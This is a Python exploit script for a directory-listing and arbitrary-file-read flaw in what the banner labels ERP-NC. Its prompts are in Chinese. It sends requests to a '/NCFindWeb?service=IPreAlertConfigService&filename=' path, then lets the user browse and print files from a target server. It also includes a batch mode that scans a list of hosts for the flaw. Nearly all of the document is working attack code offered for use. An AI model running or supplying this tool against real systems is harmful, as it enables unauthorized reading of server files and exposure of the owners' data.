# -*- coding: utf-8 -*-
# @Time    : 2020/10/16 11:03
# @Author  : Erikten
# @Site    :
# @File    : Web_injection_exp.py
# @Software: PyCharm

import requests
import time


def get_file(filename):
        new_url = url+poc+filename
        file_content = requests.get(url=new_url,timeout=3).text
        print(file_content)
        while len(file_content) < 50:
            new_url += '/'+input("请输入要访问的文件/文件名：")
            new_filename = requests.get(url=new_url,timeout=3).text
            print(new_filename)
            if len(new_filename) > 500:
                print('\n========================请稍后==========================')
                time.sleep(1)
                print(f"\n该文件可能是类文件或系统文件，请自行下载！\n\n文件链接：{new_url}")
                break
            elif len(new_filename) == 0:
                print(f"文件/文件夹为空！")
                break

def req_url(url):
    time.sleep(1)
    file_list = requests.get(url=url+poc).text
    print(file_list)
    file_name = input("请输入要访问的文件/文件夹：")
    get_file(file_name)

def check(url):
    req = requests.get(url,timeout=3).text
    if 'index.jsp' in req:
        print(f"\n目标：{url}存在漏洞！\n")



if __name__ == '__main__':
    print('''                                                                                      
,------.,------. ,------.        ,--.  ,--. ,-----.      ,------.,--.   ,--.,------.  
|  .---'|  .--. '|  .--. ',-----.|  ,'.|  |'  .--./      |  .---' \  `.'  / |  .--. ' 
|  `--, |  '--'.'|  '--' |'-----'|  |' '  ||  |          |  `--,   .'    \  |  '--' | 
|  `---.|  |\  \ |  | --'        |  | `   |'  '--'\,----.|  `---. /  .'.  \ |  | --'  
`------'`--' '--'`--'            `--'  `--' `-----''----'`------''--'   '--'`--'      
                                                                                      v1.0
                                                                                      By：Erikten
    ''')


    poc = "/NCFindWeb?service=IPreAlertConfigService&filename="

    chose = input('请选择单一检测或者批量检测（u or t）：')
    if chose == 'u':
        url = input("\n请输入目标网址：")
        if "http" not in url:
            url = 'http://'+url
            print ('\n==========================请稍候============================\n')
            check(url.strip("\n"))
            req_url(url)
        else:
            check(url.strip("\n"))
            req_url(url)
    elif chose == 't':
        print("\n批量功能仅支持检测，不支持利用，请自行单个利用，深感抱歉！\n")
        urls = input('请指定目录文件：')
        print ('\n============================请稍候============================\n')
        with open(urls) as file:
            for host in file:
                if "http" not in host:
                    host = 'http://'+host
                    check(host.strip("\n"))
    else:
        print ('您的输入有误，请检查后重新输入！')
    print ('\n========================检测已结束==========================')